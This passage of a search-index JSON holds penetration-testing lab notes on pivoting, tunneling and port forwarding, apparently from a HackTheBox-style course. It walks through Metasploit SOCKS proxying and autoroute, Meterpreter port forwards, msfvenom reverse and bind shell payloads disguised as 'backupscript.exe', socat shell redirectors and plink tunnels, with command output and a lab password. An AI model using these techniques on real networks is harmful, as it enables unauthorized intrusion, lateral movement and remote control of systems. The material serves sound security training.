Linux-based and Windows-based pivot hosts.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#ping-sweep-for-loop-on-linux-pivot-hosts","title":"Ping Sweep For Loop on Linux Pivot Hosts","text":"<p>Ping Sweep For Loop on Linux Pivot Hosts</p> <pre><code>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#ping-sweep-for-loop-using-cmd","title":"Ping Sweep For Loop Using CMD","text":"<p>Ping Sweep For Loop Using CMD</p> <pre><code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\"\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#ping-sweep-using-powershell","title":"Ping Sweep Using PowerShell","text":"<p>Ping Sweep Using PowerShell</p> <pre><code>1..254 | % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"}\n</code></pre> <p>Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.</p> <p>There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module <code>socks_proxy</code> to configure a local proxy on our attack host. We will configure the SOCKS proxy for <code>SOCKS version 4a</code>. This SOCKS configuration will start a listener on port <code>9050</code> and route all the traffic received via our Meterpreter session.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#configuring-msfs-socks-proxy","title":"Configuring MSF's SOCKS Proxy","text":"<p>Configuring MSF's SOCKS Proxy</p> <pre><code>msf6 &gt; use auxiliary/server/socks_proxy\n\nmsf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050\nSRVPORT =&gt; 9050\nmsf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0\nSRVHOST =&gt; 0.0.0.0\nmsf6 auxiliary(server/socks_proxy) &gt; set version 4a\nversion =&gt; 4a\nmsf6 auxiliary(server/socks_proxy) &gt; run\n[*] Auxiliary module running as background job 0.\n\n[*] Starting the SOCKS proxy server\nmsf6 auxiliary(server/socks_proxy) &gt; options\n\nModule options (auxiliary/server/socks_proxy):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SRVHOST  0.0.0.0          yes       The address to listen on\n   SRVPORT  9050             yes       The port to listen on\n   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,\n                                        5)\n\n\nAuxiliary action:\n\n   Name   Description\n   ----   -----------\n   Proxy  Run a SOCKS proxy server\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#confirming-proxy-server-is-running","title":"Confirming Proxy Server is Running","text":"<p>Confirming Proxy Server is Running</p> <pre><code>msf6 auxiliary(server/socks_proxy) &gt; jobs\n\nJobs\n====\n\n  Id  Name                           Payload  Payload opts\n  --  ----                           -------  ------------\n  0   Auxiliary: server/socks_proxy\n</code></pre> <p>After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our <code>proxychains.conf</code> file located at <code>/etc/proxychains.conf</code> if it isn't already there.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#adding-a-line-to-proxychainsconf-if-needed","title":"Adding a Line to proxychains.conf if Needed","text":"<p>Adding a Line to proxychains.conf if Needed</p> <pre><code>socks4  127.0.0.1 9050\n</code></pre> <p>Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.</p> <p>Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the <code>post/multi/manage/autoroute</code> module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#creating-routes-with-autoroute","title":"Creating Routes with AutoRoute","text":"<p>Creating Routes with AutoRoute</p> <pre><code>msf6 &gt; use post/multi/manage/autoroute\n\nmsf6 post(multi/manage/autoroute) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0\nSUBNET =&gt; 172.16.5.0\nmsf6 post(multi/manage/autoroute) &gt; run\n\n[!] SESSION may not be compatible with this module:\n[!]  * incompatible session platform: linux\n[*] Running module against 10.129.202.64\n[*] Searching for subnets to autoroute.\n[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.\n[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.\n[*] Post module execution completed\n</code></pre> <p>It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.</p> <p>Creating Routes with AutoRoute</p> <pre><code>meterpreter &gt; run autoroute -s 172.16.5.0/23\n\n[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.\n[!] Example: run post/multi/manage/autoroute OPTION=value [...]\n[*] Adding a route to 172.16.5.0/255.255.254.0...\n[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64\n[*] Use the -p option to list all active routes\n</code></pre> <p>After adding the necessary route(s) we can use the <code>-p</code> option to list the active routes to make sure our configuration is applied as expected.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#listing-active-routes-with-autoroute","title":"Listing Active Routes with AutoRoute","text":"<p>Listing Active Routes with AutoRoute</p> <pre><code>meterpreter &gt; run autoroute -p\n\n[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.\n[!] Example: run post/multi/manage/autoroute OPTION=value [...]\n\nActive Routing Table\n====================\n\n   Subnet             Netmask            Gateway\n   ------             -------            -------\n   10.129.0.0         255.255.0.0        Session 1\n   172.16.4.0         255.255.254.0      Session 1\n   172.16.5.0         255.255.254.0      Session 1\n</code></pre> <p>As you can see from the output above, the route has been added to the 172.16.5.0/23 network. We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#testing-proxy-routing-functionality","title":"Testing Proxy &amp; Routing Functionality","text":"<p>Testing Proxy &amp; Routing Functionality</p> <pre><code>darkinga@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn\n\nProxyChains-3.1 (http://proxychains.sf.net)\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST\nInitiating Parallel DNS resolution of 1 host. at 13:40\nCompleted Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed\nInitiating Connect Scan at 13:40\nScanning 172.16.5.19 [1 port]\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19 :3389-&lt;&gt;&lt;&gt;-OK\nDiscovered open port 3389/tcp on 172.16.5.19\nCompleted Connect Scan at 13:40, 0.12s elapsed (1 total ports)\nNmap scan report for 172.16.5.19 \nHost is up (0.12s latency).\n\nPORT     STATE SERVICE\n3389/tcp open  ms-wbt-server\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.45 seconds\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#port-forwarding","title":"Port Forwarding","text":"<p>Port forwarding can also be accomplished using Meterpreter's <code>portfwd</code> module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#portfwd-options","title":"Portfwd options","text":"<p>Portfwd options</p> <pre><code>meterpreter &gt; help portfwd\n\nUsage: portfwd [-h] [add | delete | list | flush] [args]\n\n\nOPTIONS:\n\n    -h        Help banner.\n    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the \"list\" command).\n    -l &lt;opt&gt;  Forward: local port to listen on. Reverse: local port to connect to.\n    -L &lt;opt&gt;  Forward: local host to listen on (optional). Reverse: local host to connect to.\n    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.\n    -r &lt;opt&gt;  Forward: remote host to connect to.\n    -R        Indicates a reverse port forward.\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#creating-local-tcp-relay","title":"Creating Local TCP Relay","text":"<p>Creating Local TCP Relay</p> <pre><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19\n\n[*] Local TCP relay created: :3300 &lt;-&gt; 172.16.5.19:3389\n</code></pre> <p>The above command requests the Meterpreter session to start a listener on our attack host's local port (<code>-l</code>) <code>3300</code> and forward all the packets to the remote (<code>-r</code>) Windows server <code>172.16.5.19</code> on <code>3389</code> port (<code>-p</code>) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#connecting-to-windows-target-through-localhost","title":"Connecting to Windows Target through localhost","text":"<p>Connecting to Windows Target through localhost</p> <pre><code>darkinga@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#netstat-output","title":"Netstat Output","text":"<p>We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.</p> <p>Netstat Output</p> <pre><code>darkinga@htb[/htb]$ netstat -antp\n\ntcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp \n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#meterpreter-reverse-port-forwarding","title":"Meterpreter Reverse Port Forwarding","text":"<p>Similar to local port forwards, Metasploit can also perform <code>reverse port forwarding</code> with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port <code>1234</code> to our listener on port <code>8081</code>.</p> <p>We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port <code>1234</code> running on the Ubuntu server to our attack host on local port (<code>-l</code>) <code>8081</code>. We will also configure our listener to listen on port 8081 for a Windows shell.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#reverse-port-forwarding-rules","title":"Reverse Port Forwarding Rules","text":"<p>Reverse Port Forwarding Rules</p> <pre><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18\n\n[*] Local TCP relay created: 10.10.14.18:8081 &lt;-&gt; :1234\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#configuring-starting-multihandler","title":"Configuring &amp; Starting multi/handler","text":"<p>Configuring &amp; Starting multi/handler</p> <pre><code>meterpreter &gt; bg\n\n[*] Backgrounding session 1...\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; set LPORT 8081 \nLPORT =&gt; 8081\nmsf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0 \nLHOST =&gt; 0.0.0.0\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 0.0.0.0:8081 \n</code></pre> <p>We can now create a reverse shell payload that will send a connection back to our Ubuntu server on <code>172.16.5.129</code>:<code>1234</code> when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to <code>attack host's ip</code>:<code>8081</code> that we configured.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#generating-the-windows-payload","title":"Generating the Windows Payload","text":"<p>Generating the Windows Payload</p> <pre><code>darkinga@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: backupscript.exe\n</code></pre> <p>Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#establishing-the-meterpreter-session","title":"Establishing the Meterpreter session","text":"<p>Establishing the Meterpreter session</p> <pre><code>[*] Started reverse TCP handler on 0.0.0.0:8081 \n[*] Sending stage (200262 bytes) to 10.10.14.18\n[*] Meterpreter session 2 opened (10.10.14.18:8081 -&gt; 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500\n\nmeterpreter &gt; shell\nProcess 2336 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.1637]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\&gt;\n</code></pre> <p>Note: When spawning your target, we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#playing-pong-with-socat","title":"Playing Pong with Socat","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#socat-redirection-with-a-reverse-shell","title":"Socat Redirection with a Reverse Shell","text":"<p>Socat is a bidirectional relay tool that can create pipe sockets between <code>2</code> independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start <code>socat</code> on the Ubuntu server.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#starting-socat-listener","title":"Starting Socat Listener","text":"<p>Starting Socat Listener</p> <pre><code>ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80\n</code></pre> <p>Socat will listen on localhost on port <code>8080</code> and forward all the traffic to port <code>80</code> on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#creating-the-windows-payload","title":"Creating the Windows Payload","text":"<p>Creating the Windows Payload</p> <pre><code>darkinga@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 743 bytes\nFinal size of exe file: 7168 bytes\nSaved as: backupscript.exe\n</code></pre> <p>Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#starting-msf-console","title":"Starting MSF Console","text":"<p>Starting MSF Console</p> <pre><code>darkinga@htb[/htb]$ sudo msfconsole\n\n&lt;SNIP&gt;\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#configuring-starting-the-multihandler_2","title":"Configuring &amp; Starting the multi/handler","text":"<p>Configuring &amp; Starting the multi/handler</p> <pre><code>msf6 &gt; use exploit/multi/handler\n\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_https\npayload =&gt; windows/x64/meterpreter/reverse_https\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nlhost =&gt; 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 80\nlport =&gt; 80\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started HTTPS reverse handler on https://0.0.0.0:80\n</code></pre> <p>We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#establishing-the-meterpreter-session_1","title":"Establishing the Meterpreter Session","text":"<p>Establishing the Meterpreter Session</p> <pre><code>[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!\n[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...\n[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!\n[*] Meterpreter session 1 opened (10.10.14.18:80 -&gt; 127.0.0.1 ) at 2022-03-07 11:08:10 -0500\n\nmeterpreter &gt; getuid\nServer username: INLANEFREIGHT\\victor\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#socat-redirection-with-a-bind-shell","title":"Socat Redirection with a Bind Shell","text":"<p>Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. The below figure should explain the pivot in a much better way.</p> <p></p> <p>We can create a bind shell using msfvenom with the below command.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#creating-the-windows-payload_1","title":"Creating the Windows Payload","text":"<p>Creating the Windows Payload</p> <pre><code>darkinga@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 499 bytes\nFinal size of exe file: 7168 bytes\nSaved as: backupjob.exe\n</code></pre> <p>We can start a <code>socat bind shell</code> listener, which listens on port <code>8080</code> and forwards packets to Windows server <code>8443</code>.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#starting-socat-bind-shell-listener","title":"Starting Socat Bind Shell Listener","text":"<p>Starting Socat Bind Shell Listener</p> <pre><code>ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443\n</code></pre> <p>Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#configuring-starting-the-bind-multihandler","title":"Configuring &amp; Starting the Bind multi/handler","text":"<p>Configuring &amp; Starting the Bind multi/handler</p> <pre><code>msf6 &gt; use exploit/multi/handler\n\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcp\npayload =&gt; windows/x64/meterpreter/bind_tcp\nmsf6 exploit(multi/handler) &gt; set RHOST 10.129.202.64\nRHOST =&gt; 10.129.202.64\nmsf6 exploit(multi/handler) &gt; set LPORT 8080\nLPORT =&gt; 8080\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started bind TCP handler against 10.129.202.64:8080\n</code></pre> <p>We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#establishing-meterpreter-session","title":"Establishing Meterpreter Session","text":"<p>Establishing Meterpreter Session</p> <pre><code>[*] Sending stage (200262 bytes) to 10.129.202.64\n[*] Meterpreter session 1 opened (10.10.14.18:46253 -&gt; 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500\n\nmeterpreter &gt; getuid\nServer username: INLANEFREIGHT\\victor\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#pivoting-around-obstacles","title":"Pivoting Around Obstacles","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#ssh-for-windows-plinkexe","title":"SSH for Windows: plink.exe","text":"<p>Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of 2018, Windows did not have a native ssh client included, so users would have to install their own. The tool of choice for many a sysadmin who needed to connect to other hosts was PuTTY.</p> <p>Imagine that we are on a pentest and gain access to a Windows machine. We quickly enumerate the host and its security posture and determine that it is moderately locked down. We need to use this host as a pivot point, but it is unlikely that we will be able to pull our own tools onto the host without being exposed. Instead, we can live off the land and use what is already there. If the host is older and PuTTY is present (or we can find a copy on a file share), Plink can be our path to victory. We can use it to create our pivot and potentially avoid detection a little longer.</p> <p>That is just one potential scenario where Plink could be beneficial. We could also use Plink if we use a Windows system as our primary attack host instead of a Linux-based system.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#getting-to-know-plink","title":"Getting To Know Plink","text":"<p>In the below image, we have a Windows-based attack host.</p> <p></p> <p>The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#using-plinkexe","title":"Using Plink.exe","text":"<p>Using Plink.exe</p> <pre><code>plink -D 9050 ubuntu@10.129.15.50\n</code></pre> <p>Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It 